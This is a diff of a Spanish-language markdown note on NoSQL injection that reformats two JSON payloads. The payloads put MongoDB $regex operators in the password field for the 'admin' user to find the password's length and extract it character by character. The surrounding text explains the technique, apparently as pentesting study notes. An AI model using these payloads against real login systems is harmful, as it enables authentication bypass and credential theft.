@@ -39,13 +39,21 @@
 
 ## Descubrimiendo de contrasenias
 ```
-{"username":"admin","password":{
-"$regex":"^2"}}
+{
+	"username":"admin",
+	"password":{
+		"$regex":"^2"
+	}
+}
 ```
 - Utilizando regex en la contrasenia podemos ir caracter por caracter ayudandonos de la respuesta del servidor descubrirla completa.
 ```
-{"username":"admin","password":{
-"$regex":".{24}"}}
+{
+	"username":"admin",
+	"password":{
+		"$regex":".{24}"
+	}
+}
 ```
 - De esta otra forma podemos ver cuantos caracteres tiene la contrasenia, cuando demos en el numero nos logramos loguear igualmente.
 
